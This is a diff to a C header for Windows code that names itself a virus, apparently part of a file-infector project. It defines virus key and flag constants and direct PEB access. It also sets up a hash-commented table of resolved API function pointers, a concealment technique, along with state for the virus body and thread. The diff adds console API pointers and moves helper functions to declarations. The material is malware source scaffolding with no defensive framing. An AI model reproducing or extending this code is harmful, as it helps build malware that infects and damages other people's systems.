@@ -12,14 +12,15 @@
 #include <winternl.h>
 #include <imagehlp.h>
 
-//#include <iostream>
-//using namespace std;
+#include <string>
+#include <vector>
+#include <filesystem>
+#include <fstream>
 
 #define VIRUS_KEY 0xF4
 #define VIRUS_FLAG ((VIRUS_KEY^0x7FFFFFFF)^0xF0F0F0F0)
 
 #define NtCurrentPeb()     (PPEB)(NtCurrentTeb()->ProcessEnvironmentBlock)
-
 
 typedef BOOL (WINAPI *pCreateProcessA)(
     LPCSTR lpApplicationName,
@@ -172,6 +173,18 @@ typedef HANDLE (WINAPI* pCreateMutexA)(
     LPCSTR                lpName
 );
 
+typedef BOOL (WINAPI* pWriteConsoleA)(
+    HANDLE  hConsoleOutput,
+    const VOID    *lpBuffer,
+    DWORD   nNumberOfCharsToWrite,
+    LPDWORD lpNumberOfCharsWritten,
+    LPVOID  lpReserved
+);
+
+typedef HANDLE (WINAPI* pGetStdHandle)(
+    DWORD nStdHandle
+);
+
 
 typedef struct _IAT
 {
@@ -204,6 +217,8 @@ typedef struct _IAT
 
     pCreateMutexA               fnCreateMutexA;             // 0x46d6e46
 
+    pWriteConsoleA              fnWriteConsoleA;            // 0x786a6cd
+    pGetStdHandle               fnGetStdHandle;             // 0x34dcbbd3
 
     // ntdll.dll
     pNtClose            fnNtClose;                          // 0x30b4218e
@@ -219,56 +234,17 @@ typedef struct _DATA
     PVOID this_file_base_address;
     PVOID end_of_virus_main_address;
     int end_virus;
+    HANDLE virus_thread;
 } DATA, *PDATA;
 
-DWORD Align(DWORD value, DWORD alignment)
-{
-    if (value % alignment == 0)
-    {
-        return value;
-    }
-    else
-    {
-        return (value/alignment + 1)*alignment;
-    }
-}
+DWORD Align(DWORD value, DWORD alignment);
 
-void ZeroMem(void* data, int size)
-{
-    for (int i = 0; i < size; i++)
-    {
-        *((unsigned char*)(data)+i) = 0;
-    }
-}
+void ZeroMem(void* data, int size);
 
-void MemCopy(void* dst, void *src, int size)
-{
-    for (int i = 0; i < size; i++)
-    {
-        *((unsigned char*)(dst)+i) = *((unsigned char*)(src)+i);
-    }
-}
+void MemCopy(void* dst, void *src, int size);
 
-BYTE StrCmp(void* str1, void *str2)
-{
-    for (int i = 0; ; i++)
-    {
-        if (*((unsigned char*)(str1)+i) != *((unsigned char*)(str2)+i))
-        {
-            return 0;
-        }
-        if (*((unsigned char*)(str1)+i) == 0 || *((unsigned char*)(str2)+i) == 0)
-        {
-            return 1;
-        }
-    }
-}
+BYTE StrCmp(void* str1, void *str2);
 
-unsigned long long MemoryToUint64(unsigned char* data)
-{
-    unsigned long long ans = 0;
-    memcpy(&ans, data, 8);
-    return ans;
-}
+unsigned long long MemoryToUint64(unsigned char* data);
 
 #endif
